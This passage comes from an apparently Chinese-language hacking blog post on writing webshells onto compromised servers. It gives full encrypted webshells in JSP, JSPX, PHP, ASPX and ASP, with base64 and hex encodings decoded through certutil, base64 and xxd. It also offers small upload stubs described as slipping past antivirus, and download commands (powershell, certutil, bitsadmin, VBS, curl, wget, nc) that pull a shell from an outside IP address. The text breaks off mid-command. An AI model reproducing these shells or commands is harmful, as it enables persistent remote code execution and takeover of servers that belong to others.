+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;); byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;&apos; &gt; 111.aspx</span><br></pre></td></tr></table></figure>
+<p><strong>（5）asp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &apos;&lt;%\nResponse.CharSet = &quot;UTF-8&quot; \nk=&quot;e45e329feb5d925b&quot; \nSession(&quot;k&quot;)=k\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\n%&gt;&apos; &gt; 111.asp</span><br></pre></td></tr></table></figure>
+<h3 id="2-转换法"><a href="#2-转换法" class="headerlink" title="2.转换法"></a>2.转换法</h3><p>转换法，懂得都懂。</p>
+<p>问题来了 小马或者大马存在各种特殊字符需要转义输出文件中内容各种报错不解析等等<br>这时候我们可以利用<code>base64</code>编码再解码输出到文件，完美解决转义问题<br>语句如下：</p>
+<p><strong>（a）Windows</strong></p>
+<p>在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式，没有列出冰蝎各语言shell，表哥们自己整理吧。</p>
+<p><strong>（1）certutil-Base64</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= &gt; 111.txt</span><br><span class="line">certutil -f -decode 111.txt C:\\111.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（2）certutil-Hex</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e &gt; 111.txt</span><br><span class="line"></span><br><span class="line">certutil -decodehex 111.txt C:\\111.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（b）Linux</strong></p>
+<p>和windows不同，linux在途中就已经转换完毕，落地文件已经成为shell。大部分玩家都是懒得转义shell中的字符，而使用下面的方法。主要也是分base64以及hex两种。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo base64后的木马内容 |base64 -d &gt; 360.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（1）jsp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= |base64 -d &gt; 111.jsp</span><br><span class="line"></span><br><span class="line">echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e|xxd -r -ps &gt; 111.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（2）jspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+IGNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD5TdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYygoc2Vzc2lvbi5nZXRWYWx1ZSgidSIpKyIiKS5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7PC9qc3A6c2NyaXB0bGV0PjwvanNwOnJvb3Q+|base64 -d &gt; 111.jsp</span><br><span class="line"></span><br><span class="line">echo 3c6a73703a726f6f7420786d6c6e733a6a73703d22687474703a2f2f6a6176612e73756e2e636f6d2f4a53502f50616765222076657273696f6e3d22312e32223e3c6a73703a6469726563746976652e7061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a222f3e3c6a73703a6465636c61726174696f6e3e20636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d3c2f6a73703a6465636c61726174696f6e3e3c6a73703a7363726970746c65743e537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563282873657373696f6e2e67657456616c756528227522292b2222292e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b3c2f6a73703a7363726970746c65743e3c2f6a73703a726f6f743e|xxd -r -ps &gt; 111.jspx</span><br></pre></td></tr></table></figure>
+<p><strong>（3）php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTtzZXNzaW9uX3N0YXJ0KCk7JGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7JF9TRVNTSU9OWydrJ109JGtleTtzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7JHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7aWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSl7JHQ9ImJhc2U2NF8iLiJkZWNvZGUiOyRwb3N0PSR0KCRwb3N0LiIiKTtmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHskcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgfX1lbHNleyRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpO30kYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTskZnVuYz0kYXJyWzBdOyRwYXJhbXM9JGFyclsxXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319QGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Pz4K|base64 -d &gt; 111.php</span><br><span class="line"></span><br><span class="line">echo 3c3f70687020406572726f725f7265706f7274696e672830293b73657373696f6e5f737461727428293b246b65793d2265343565333239666562356439323562223b245f53455353494f4e5b276b275d3d246b65793b73657373696f6e5f77726974655f636c6f736528293b24706f73743d66696c655f6765745f636f6e74656e747328227068703a2f2f696e70757422293b69662821657874656e73696f6e5f6c6f6164656428276f70656e73736c2729297b24743d226261736536345f222e226465636f6465223b24706f73743d24742824706f73742e2222293b666f722824693d303b24693c7374726c656e2824706f7374293b24692b2b29207b24706f73745b24695d203d2024706f73745b24695d5e246b65795b24692b312631355d3b207d7d656c73657b24706f73743d6f70656e73736c5f646563727970742824706f73742c2022414553313238222c20246b6579293b7d246172723d6578706c6f646528277c272c24706f7374293b2466756e633d246172725b305d3b24706172616d733d246172725b315d3b636c61737320437b7075626c69632066756e6374696f6e205f5f696e766f6b6528247029207b6576616c2824702e2222293b7d7d4063616c6c5f757365725f66756e63286e6577204328292c24706172616d73293b3f3ea|xxd -r -ps &gt; 111.php</span><br></pre></td></tr></table></figure>
+<p><strong>（4）aspx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlQEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5SZWZsZWN0aW9uIiU+PCVTZXNzaW9uLkFkZCgiayIsImU0NWUzMjlmZWI1ZDkyNWIiKTtieXRlW10gayA9IEVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoU2Vzc2lvblswXSArICIiKSxjID0gUmVxdWVzdC5CaW5hcnlSZWFkKFJlcXVlc3QuQ29udGVudExlbmd0aCk7QXNzZW1ibHkuTG9hZChuZXcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQoKS5DcmVhdGVEZWNyeXB0b3IoaywgaykuVHJhbnNmb3JtRmluYWxCbG9jayhjLCAwLCBjLkxlbmd0aCkpLkNyZWF0ZUluc3RhbmNlKCJVIikuRXF1YWxzKHRoaXMpOyU+|base64 -d &gt; 111.aspx</span><br><span class="line"></span><br><span class="line">echo 3c25402050616765204c616e67756167653d2243232220253e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22253e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b253e|xxd -r -ps &gt; 111.aspx</span><br></pre></td></tr></table></figure>
+<p><strong>（5）asp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo PCUKUmVzcG9uc2UuQ2hhclNldCA9ICJVVEYtOCIgCms9ImU0NWUzMjlmZWI1ZDkyNWIiClNlc3Npb24oImsiKT1rCnNpemU9UmVxdWVzdC5Ub3RhbEJ5dGVzCmNvbnRlbnQ9UmVxdWVzdC5CaW5hcnlSZWFkKHNpemUpCkZvciBpPTEgVG8gc2l6ZQpyZXN1bHQ9cmVzdWx0JkNocihhc2NiKG1pZGIoY29udGVudCxpLDEpKSBYb3IgQXNjKE1pZChrLChpIGFuZCAxNSkrMSwxKSkpCk5leHQKZXhlY3V0ZShyZXN1bHQpCiU+|base64 -d &gt; 111.asp</span><br></pre></td></tr></table></figure>
+<h3 id="3-二次法"><a href="#3-二次法" class="headerlink" title="3.二次法"></a>3.二次法</h3><p>对于二次法，就是先传一个文件上传的小“shell”,然后通过指定方式进行上传其他文件。有一个好处就是，它本身不是木马病毒，就是一个写入文件的功能脚本，所以一般杀毒不会杀，这样我们就可以随意上传了。</p>
+<p><strong>（a）JSP</strong></p>
+<p>GET类型</p>
+<p><strong>（1）god.jsp内容 （先遣部队）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>（2）写jsp shell</strong></p>
+<p>get类型写shell需要注意url编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/god.jsp?f=111.jsp&amp;t=&lt;%25@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%25&gt;&lt;%25!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%25&gt;&lt;%25if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%25&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>（3）写jspx shell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/god.jsp?f=111.jspx&amp;t=&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)%2B&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure>
+<p>POST类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=”java” pageEncoding=”gbk”%&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:directive.page import=&quot;java.io.File&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:directive.page import=&quot;java.io.OutputStream&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:directive.page import=&quot;java.io.FileOutputStream&quot;/&gt;</span><br><span class="line">&lt;% int i=0;String method=request.getParameter(“act”);if(method!=null&amp;&amp;method.equals(“yoco”))&#123;String url=request.getParameter(“url”);String text=request.getParameter(“smart”);File f=new File(url);if(f.exists())&#123;f.delete();&#125;try&#123;OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();&#125;catch(Exception e)&#123;i++;%&gt;</span><br><span class="line">error</span><br><span class="line">&lt;%&#125;&#125;if(i==0)&#123;%&gt;</span><br><span class="line">ok</span><br><span class="line">&lt;%&#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&apos;?act=yoco&apos; method=&apos;post&apos;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input size=&quot;100&quot; value=&quot;&lt;%=application.getRealPath(&quot;/&quot;) %&gt;&quot; name=&quot;url&quot;&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea rows=&quot;20&quot; cols=&quot;80&quot; name=&quot;smart&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>（b）PHP</strong></p>
+<p>GET类型</p>
+<p><strong>（1）god.php内容 （先遣部队）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fwrite(fopen($_GET[&apos;filename&apos;], &quot;w&quot;), $_GET[&apos;content&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>（2）写php shell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/god.php?filename=111.php&amp;content=&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&apos;k&apos;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&apos;openssl&apos;))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i%2B%2B) &#123;$post[$i] = $post[$i]^$key[$i%2B1%2615]; &#125;&#125;else&#123;$post=openssl_decrypt($post, &quot;AES128&quot;, $key);&#125;$arr=explode(&apos;|&apos;,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt;</span><br></pre></td></tr></table></figure>
+<p>POST类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;Filename:&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;&lt;br /&gt;Content:&lt;br /&gt;&lt;textarea rows=&quot;20&quot; cols=&quot;80&quot; name=&quot;content&quot;&gt;&lt;?php fwrite(fopen($_POST[&apos;filename&apos;], &quot;w&quot;), $_POST[&apos;content&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>（c）ASPX</strong></p>
+<p>对于aspx来说，此功能可能比较鸡肋，因为aspx写文件需要一定权限。</p>
+<p>GET类型</p>
+<p><strong>（1）god.aspx内容 （先遣部队）</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;% System.IO.File.WriteAllText(System.AppDomain.CurrentDomain.BaseDirectory+&quot;\\&quot;+Request.QueryString[&quot;filename&quot;], Request.QueryString[&quot;content&quot;]);%&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>（2）写aspx shell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/god.aspx?filename=god.aspx&amp;content=&lt;%@ Page Language=&quot;C%23&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;);byte[] k = Encoding.Default.GetBytes(Session[0] %2B &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="4-远程下载法"><a href="#4-远程下载法" class="headerlink" title="4.远程下载法"></a>4.远程下载法</h3><p>远程下载法，常用于，可以通外网的战法。这里只总结了部分。像ftp之类的没有总结。</p>
+<p><strong>（a）Windows</strong></p>
+<p><strong>（1）powershell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&apos;http://101.32.185.60:8080/111.jsp&apos;,&apos;C:\\Windows\\2.jsp&apos;)</span><br></pre></td></tr></table></figure>
+<p><strong>（2）certutil</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://101.32.185.60:8080/111.jsp C:\\Windows\\3.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（3）bitsadmin</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://101.32.185.60:8080/111.jsp C:\\Windows\\1.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（4）vbs</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;):Set Shell = CreateObject(&quot;Wscript.Shell&quot;):Set aGet = CreateObject(&quot;ADODB.Stream&quot;):Post.Open &quot;GET&quot;,&quot;http://101.32.185.60:8080/111.jsp&quot;,0:Post.Send():aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile &quot;C:\333.jsp&quot;,2 &gt; 111.vbs&amp;111.vbs</span><br></pre></td></tr></table></figure>
+<p><strong>（b）Linux</strong></p>
+<p><strong>（1）curl</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://101.32.185.60:8080/111.jsp -o /root/3.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（2）wget</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://101.32.185.60:8080/111.jsp -o /root/3.jsp</span><br></pre></td></tr></table></figure>
+<p><strong>（3）nc</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -l 9992 &lt;111.jsp #vps执行</span><br><span class="line"></span><br><span class="line">nc 101.32.185.60 9992 &gt;222.jsp #目标机器执行</span><br></pre></td></tr></table></figure>
+<p>一起研究，共同进步。<br>大佬轻喷。</p>
+<p>参考链接：<br><a href="https://www.freebuf.com/articles/web/201013.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/201013.html</a><br><a href="https://wiki.silic.wiki/工具分享:超精简jsp上传小马" target="_blank" rel="noopener">https://wiki.silic.wiki/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB:%E8%B6%85%E7%B2%BE%E7%AE%80jsp%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC</a></p>
+<h3 id="遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写："><a href="#遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写：" class="headerlink" title="遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写："></a>遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写：</h3><p>powershell 